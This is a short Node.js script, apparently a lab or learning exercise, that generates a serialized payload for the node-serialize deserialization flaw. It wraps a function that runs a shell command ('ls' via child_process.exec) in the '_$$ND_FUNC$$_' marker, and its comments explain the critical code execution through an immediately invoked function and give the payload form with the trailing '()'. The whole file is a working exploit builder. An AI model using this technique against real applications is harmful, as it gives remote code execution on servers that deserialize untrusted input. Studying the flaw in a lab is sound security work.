var exec = require('child_process').exec;

var x = {
  test: function() {
    exec('ls', function(error, stdout, stderr) {
      if (error) {
        // console.error('Error executing command:', error);
        return;
      }
      console.log('Command output:', stdout);
    });
  }
};


function serialize(obj) {
  var serializedObj = {};
  for (var key in obj) {
    if (typeof obj[key] === 'function') {
      serializedObj[key] = "_$$ND_FUNC$$_" + obj[key].toString();
    } else {
      serializedObj[key] = obj[key];
    }
  }
  return JSON.stringify(serializedObj);
}

var serializedData = serialize(x);
console.log(serializedData);




/*
With the use of node-serialize module. But it has Code Execution through IIFE(Critical)

var serialize = require('node-serialize');

var x = {
  test: function() {
    return 'hi';
  }
};

var serialized = serialize.serialize(x);
console.log("Serialized:\n" + serialized);
*/
/*
to run: node to_serialize.js
payload to put after output from code: "_$$ND_FUNC$$_function (){ return 'hi'; }()"
*/

/*
var serialize = require('node-serialize');

x = {
test : function(){ return 'hi'; }
};

console.log("Serialized: \n" + serialize.serialize(x));
*/
